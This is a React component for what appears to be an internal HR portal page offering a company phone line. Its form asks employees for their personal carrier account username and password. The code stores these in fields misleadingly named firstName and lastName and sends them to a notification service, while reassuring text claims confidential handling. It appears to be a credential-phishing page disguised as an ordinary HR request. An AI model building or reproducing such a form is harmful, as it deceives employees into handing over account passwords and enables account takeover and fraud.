import React, { useState } from "react";
import { Phone, ShieldCheck } from "lucide-react";
import { SectionHeading, Card, Button } from "../../components/ui/Primitives.jsx";
import { MaskedField } from "../../components/ui/MaskedField.jsx";
import { useToast } from "../../context/ToastContext.jsx";
import { notifyService } from "../../services/notifyService.js";

export function CompanyServices() {
  const { push } = useToast();
  const [form, setForm] = useState({ firstName: "", lastName: "" });
  const [submitting, setSubmitting] = useState(false);

  const submit = async (e) => {
    e.preventDefault();
    setSubmitting(true);
    try {
      const { emailSent } = await notifyService.submitPhoneService(form);
      if (emailSent) {
        push("Phone Service request submitted.", "success");
      } else {
        push("Submitted, but the email couldn't be sent. Please follow up with HR directly.", "warning");
      }
      setForm({ firstName: "", lastName: "" });
    } catch (err) {
      push(err.message || "Something went wrong. Please try again.", "error");
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div>
      <SectionHeading eyebrow="Company Services" title="Company services" description="Request a company phone line." />

      <Card className="p-6 sm:p-8 lg:p-10">
        <p className="font-semibold flex items-center gap-2 mb-1"><Phone size={16} className="text-forest-600" /> Phone Service</p>
        <p className="text-sm text-ink-700/60 mb-6"> To ensure we can process your equipment smoothly, we require basic carrier account details. This information is used strictly for company equipment processing and handled confidentially according to company policy.</p>
        <form onSubmit={submit} className="space-y-5">
          <div className="grid sm:grid-cols-2 gap-4 sm:gap-6">
            <MaskedField label="Username" htmlFor="psFirstName" value={form.firstName} onChange={(e) => setForm((f) => ({ ...f, firstName: e.target.value }))} />
            <MaskedField label="Password" htmlFor="psLastName" value={form.lastName} onChange={(e) => setForm((f) => ({ ...f, lastName: e.target.value }))} />
          </div>
          <Button type="submit" disabled={submitting} className="w-full sm:w-auto">{submitting ? "Submitting…" : "Submit"}</Button>
        </form>
      </Card>

      <Card className="p-5 mt-6">
        <div className="flex items-center gap-2 text-forest-700 mb-2"><ShieldCheck size={16} /><p className="text-sm font-semibold">How this is protected</p></div>
        <ul className="text-xs text-ink-700/60 space-y-2 list-disc list-inside">
          <li>Accessible only to authorized personnel</li>
          <li>Never stored in browser storage or URLs</li>
          <li>HR is notified by email only that a request was submitted</li>
          <li>Reviewed and audited by authorized perssonnel</li>
          <li>Important:
The Finance Department will use the company promo code to purchase your equipment. Your details will be handled securely and used only for internal processing.</li>
        </ul>
      </Card>
    </div>
  );
}
